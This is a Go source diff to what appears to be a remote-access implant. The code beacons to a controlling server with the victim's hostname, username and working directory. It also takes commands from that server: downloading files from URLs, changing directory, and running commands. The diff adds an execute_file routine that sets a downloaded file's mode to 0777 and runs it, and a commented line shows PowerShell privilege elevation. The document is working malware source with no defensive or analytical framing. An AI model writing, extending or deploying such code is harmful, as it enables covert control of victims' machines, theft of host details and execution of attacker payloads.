@@ -98,6 +98,7 @@ func postFile(filename string, targetUrl string) error {
 }
 
 func downloadFile(filepath string, url string) (err error) {
+  fmt.Printf("Filepath:%s\n", filepath)
 
   // Create the file
   out, err := os.Create(filepath)
@@ -127,6 +128,15 @@ func downloadFile(filepath string, url string) (err error) {
   return nil
 }
 
+func execute_file(c string, args[]string){
+    f := c
+    if !path.IsAbs(c){
+      cwd, _ := os.Getwd()
+      f = path.Join(cwd, f)
+    }
+    os.Chmod(f, os.FileMode(int(0777)) )
+    execute(f, args)
+}
 
 func execute_raw(c string, args []string) ([]byte){
   //cmd := exec.Command("cmd", "/C", string("powershell.exe -Command Start-Process -Verb RunAs "+string(Command[1])));
@@ -165,7 +175,7 @@ func get_beacon() url.Values {
     var timestamp int32
     timestamp = int32(time.Now().Unix())
 
-    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Name}, "cwd":{dir}}
+    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Username}, "cwd":{dir}}
 }
 
 // Convert key, value strings to url.Values
@@ -223,20 +233,28 @@ func do_cmd(body []byte) bool {
             }
         } else if cmd == "upload" {
             fmt.Printf("Fulfilling cmd: Upload\n")
-            //file_url := record.([]interface{})[0].(string)
-            file_url := record.(string)
+            file_url := record.([]interface{})[0].(string)
+            filename := record.([]interface{})[1].(string)
+            
+            //file_url := record.(string)
             u, _ := url.Parse(file_url)
             fmt.Printf("Path: %s", u.Path)
             if u.Path == "/" {
                 u.Path = "/tmp"
             }
+            /*
             filename := path.Base(u.Path)
-            wd, _ := os.Getwd()
-            filename = filepath.Join(wd, filename)
-
+            */
+            if !path.IsAbs(filename) {
+                wd, _ := os.Getwd()
+                filename = filepath.Join(wd, filename)
+            }
             //rec := get_args(record.([]interface{}))
             fmt.Printf("Rec: %s\n", record)
-            downloadFile(filename, file_url)
+            err := downloadFile(filename, file_url)
+            if err != nil{
+                fmt.Println(err)
+            }
         } else if cmd == "cd" {
             dir := record.([]interface{})[0].(string)
             fmt.Printf("Changing Dir: %s \n", fmt.Sprint(dir) )
@@ -254,6 +272,8 @@ func do_cmd(body []byte) bool {
             cmd_array := stringify(record.([]interface{}))
             if cmd == "execute" {
                 go execute(cmd_array[0], cmd_array[1:])
+            } else if cmd == "execute_file" {
+                go execute_file(cmd_array[0], cmd_array[1:])
             } else {
                 go execute(cmd, cmd_array)
             }
